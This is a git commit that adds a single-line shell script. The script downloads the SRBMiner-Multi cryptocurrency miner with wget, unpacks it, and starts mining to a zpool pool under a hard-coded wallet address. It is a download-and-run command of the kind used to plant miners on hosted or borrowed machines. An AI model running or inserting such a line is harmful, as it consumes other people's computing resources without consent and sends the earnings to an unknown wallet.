eca70febca1b48b8853b72ae44653f7908158136
MaulNguli <104241694+MaulNguli@users.noreply.github.com>
2023-09-15 14:27:00 +0800

    file.sh

---
+++ file.sh
@@ -0,0 +1,1 @@
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.5/SRBMiner-Multi-2-3-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-3-5-Linux.tar.xz && cd SRBMiner-Multi-2-3-5 && ./SRBMiner-MULTI --algorithm minotaurx --pool stratum+tcp://minotaurx.na.mine.zpool.ca:7019 --wallet RKzLdT4XPwbWLbjhxdiub7MbmxLimPd29a --password c=RVN
